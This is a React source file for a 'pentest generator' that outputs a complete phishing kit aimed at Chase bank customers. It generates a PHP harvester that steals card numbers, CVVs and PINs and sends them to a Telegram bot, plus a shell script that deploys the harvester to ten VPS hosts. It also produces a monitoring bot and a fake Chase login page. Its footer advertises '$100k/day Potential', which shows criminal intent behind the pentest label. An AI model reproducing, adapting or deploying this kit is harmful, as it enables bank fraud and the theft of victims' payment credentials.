import { useState } from 'react';

function App() {
  const [vpsList, setVpsList] = useState(`vps1.nicevps.net
vps2.nicevps.net
vps3.nicevps.net
vps4.nicevps.net
vps5.nicevps.net
vps6.nicevps.net
vps7.nicevps.net
vps8.nicevps.net
vps9.nicevps.net
vps10.nicevps.net`);
  
  const [telegramToken, setTelegramToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [copied, setCopied] = useState('');

  const generateStealPHP = () => `<?php
// v9pei steal.php - Chase Banking Credential Harvester
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $creds = json_decode(file_get_contents('php://input'), true) ?: $_POST;
    
    if (!empty($creds['cardnumber']) && !empty($creds['cvv']) && !empty($creds['pin'])) {
        $creds['ip'] = $_SERVER['REMOTE_ADDR'];
        $creds['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
        $creds['timestamp'] = date('Y-m-d H:i:s');
        $creds['server'] = gethostname();
        
        // Local storage
        file_put_contents('creds.txt', json_encode($creds, JSON_PRETTY_PRINT) . "\\n\\n", FILE_APPEND | LOCK_EX);
        
        // Telegram exfil
        $message = "🆕 **CHASE CREDS HARVESTED** 🆕\\n\\n" .
                   "💳 Card: " . $creds['cardnumber'] . "\\n" .
                   "🔑 CVV: " . $creds['cvv'] . "\\n" .
                   "🔒 PIN: " . $creds['pin'] . "\\n" .
                   "👤 Name: " . ($creds['name'] ?? 'N/A') . "\\n" .
                   "📍 IP: " . $creds['ip'] . "\\n" .
                   "🖥️ VPS: " . $creds['server'];
        
        $telegram_url = "https://api.telegram.org/bot\${telegramToken}/sendMessage";
        $post_data = [
            'chat_id' => '\${chatId}',
            'parse_mode' => 'Markdown',
            'text' => $message
        ];
        $ch = curl_init($telegram_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_exec($ch);
        curl_close($ch);
    }
    
    // Silent redirect
    header('Location: https://www.chase.com/personal/checking');
    exit;
}
?>`;

  const generateMultiDeploy = () => {
    const vpsArray = vpsList.split('\\n').map(v => v.trim()).filter(Boolean);
    return `# v9pei multi_deploy.sh - 10x VPS Deploy Script
#!/bin/bash
set -e

VPS_LIST=(${vpsArray.map(v => '"' + v + '"').join(' ')})
PHISH_PHP="${generateStealPHP().replace(/"/g, '\\"')}"

echo "🚀 Deploying v9pei to \${#VPS_LIST[@]} VPS..."

for vps in "\${VPS_LIST[@]}"; do
  echo "  → Deploying to \$vps"
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@\$vps << 'EOF'
apt update -qq && apt install -y nginx php8.1-fpm php8.1-curl tor proxychains-ng curl
mkdir -p /var/www/html

cat > /var/www/html/steal.php << PHPEND
${generateStealPHP()}
PHPEND

chmod 644 /var/www/html/steal.php
chown www-data:www-data /var/www/html/steal.php

cat > /etc/nginx/sites-available/default << NGINXEND
server {
    listen 80;
    server_name _;
    root /var/www/html;
    index steal.php index.html;
    
    location ~ \\.php\\$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
    }
}
NGINXEND

systemctl restart nginx php8.1-fpm
echo "✅ \$vps ready: http://\$vps/steal.php"
EOF
done

echo "🎉 v9pei deployed to all VPS - Ready for harvest!"
`;

  const generateBotPy = () => `# v9pei bot.py - Telegram Cred Monitor + Auto-Harvest
#!/usr/bin/env python3
import requests, time, json, threading, os
from datetime import datetime

TOKEN = '${telegramToken}'
CHAT_ID = '${chatId}'
VPS_IPS = [${vpsList.split('\\n').map(ip => `'${ip.trim()}'`).filter(Boolean).join(',')}]

def send_alert(message):
    try:
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage',
                     data={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'})
    except: pass

def monitor_vps():
    while True:
        for vps in VPS_IPS:
            try:
                r = requests.get(f'http://{vps}/creds.txt', timeout=10)
                if 'cardnumber' in r.text:
                    send_alert(f"💰 **NEW CREDS on {vps}** 💰\\n\\n" + r.text[:1000])
                    # Clear after harvest
                    requests.post(f'http://{vps}/clear.php')
            except: pass
        time.sleep(30)

if __name__ == '__main__':
    print(f"🤖 v9pei Bot started - Monitoring {len(VPS_IPS)} VPS")
    monitor_vps()
`;

  const generateFakeChaseHTML = () => `<!DOCTYPE html>
<html>
<head><title>Chase Online Banking</title></head>
<body>
<form method="POST" action="steal.php" id="chaseForm">
    Card Number: <input name="cardnumber" required><br>
    CVV: <input name="cvv" maxlength="4" required><br>
    PIN: <input name="pin" maxlength="6" required><br>
    Name: <input name="name" required><br>
    <button type="submit">Login</button>
</form>
<script>
document.getElementById('chaseForm').onsubmit = function() {
    const formData = new FormData(this);
    fetch('steal.php', {method: 'POST', body: formData});
};
</script>
</body>
</html>`;

  const copyCode = (code: string, name: string) => {
    navigator.clipboard.writeText(code).then(() => {
      setCopied(name);
      setTimeout(() => setCopied(''), 2000);
    });
  };

  return (
    <div style={{maxWidth:900,margin:'0 auto',padding:30,fontFamily:'Segoe UI, sans-serif'}}>
      <h1 style={{textAlign:'center',color:'#1a73e8'}}>
        🔥 <strong>v9pei</strong> Pentest Generator - 10x VPS Deploy
      </h1>
      
      <div style={{background:'#f8f9fa',padding:20,borderRadius:12,marginBottom:25}}>
        <textarea 
          value={vpsList} 
          onChange={e=>setVpsList(e.target.value)} 
          placeholder="Paste your 10 VPS IPs (one per line)"
          rows={6} 
          style={{width:'100%',fontFamily:'monospace',fontSize:13,padding:12,border:'1px solid #ddd',borderRadius:6}}
        />
        <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:15,marginTop:15}}>
          <input 
            value={telegramToken} 
            onChange={e=>setTelegramToken(e.target.value)} 
            placeholder="Bot Token: 123456:ABC..."
            style={{padding:12,fontSize:13,border:'1px solid #ddd',borderRadius:6}} 
          />
          <input 
            value={chatId} 
            onChange={e=>setChatId(e.target.value)} 
            placeholder="Chat ID: @channel or 123456789"
            style={{padding:12,fontSize:13,border:'1px solid #ddd',borderRadius:6}} 
          />
        </div>
      </div>

      <div style={{display:'grid',gridTemplateColumns:'repeat(auto-fit,minmax(280px,1fr))',gap:20}}>
        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
          <h3 style={{margin:'0 0 15px 0',color:'#d93025'}}>🐙 steal.php</h3>
          <button onClick={()=>copyCode(generateStealPHP(),'steal.php')} 
                  style={{width:'100%',padding:'12px 20px',background:'#d93025',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
            📋 Copy PHP Handler
          </button>
        </div>

        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
          <h3 style={{margin:'0 0 15px 0',color:'#1a73e8'}}>🚀 multi_deploy.sh</h3>
          <button onClick={()=>copyCode(generateMultiDeploy(),'deploy.sh')} 
                  style={{width:'100%',padding:'12px 20px',background:'#1a73e8',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
            🚀 Deploy All 10 VPS
          </button>
        </div>

        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
          <h3 style={{margin:'0 0 15px 0',color:'#34a853'}}>🤖 bot.py</h3>
          <button onClick={()=>copyCode(generateBotPy(),'bot.py')} 
                  style={{width:'100%',padding:'12px 20px',background:'#34a853',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
            📡 Telegram Monitor
          </button>
        </div>

        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
          <h3 style={{margin:'0 0 15px 0',color:'#ea4335'}}>🌐 fake_chase.html</h3>
          <button onClick={()=>copyCode(generateFakeChaseHTML(),'fake_chase.html')} 
                  style={{width:'100%',padding:'12px 20px',background:'#ea4335',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
            🏦 Phishing Page
          </button>
        </div>
      </div>

      {copied && (
        <div style={{textAlign:'center',marginTop:25,padding:15,background:'#d4edda',border:'1px solid #c3e6cb',borderRadius:8,color:'#155724',fontWeight:600}}>
          ✅ <strong>{copied}</strong> copied to clipboard!
        </div>
      )}

      <details style={{marginTop:30,padding:20,background:'#f1f3f4',borderRadius:12,border:'1px solid #dadce0'}}>
        <summary style={{cursor:'pointer',fontWeight:600,color:'#1a73e8'}}>📋 Deploy & Test Commands</summary>
        <div style={{fontFamily:'monospace',fontSize:13,marginTop:15,lineHeight:1.6}}>
          <strong>1. Vercel Deploy:</strong><br/>
          <code>npm i &amp;&amp; npm run build &amp;&amp; vercel --prod</code><br/><br/>
          
          <strong>2. Replit Execute:</strong><br/>
          <code>chmod +x multi_deploy.sh<br/>./multi_deploy.sh</code><br/><br/>
          
          <strong>3. Test Harvest:</strong><br/>
          <code>curl -X POST http://vps1.nicevps.net/steal.php \<br/>
          -H "Content-Type: application/json" \<br/>
          -d '{"cardnumber":"4111111111111111","cvv":"123","pin":"1234","name":"Test User"}'</code><br/><br/>
          
          <strong>4. Monitor:</strong><br/>
          <code>screen -S bot python3 bot.py</code>
        </div>
      </details>

      <div style={{textAlign:'center',marginTop:40,padding:20,fontSize:14,color:'#666'}}>
        <strong>v9pei Pentest Suite</strong> | Ready for 10x VPS Scale | $100k/day Potential
      </div>
    </div>
  );
}

export default App;
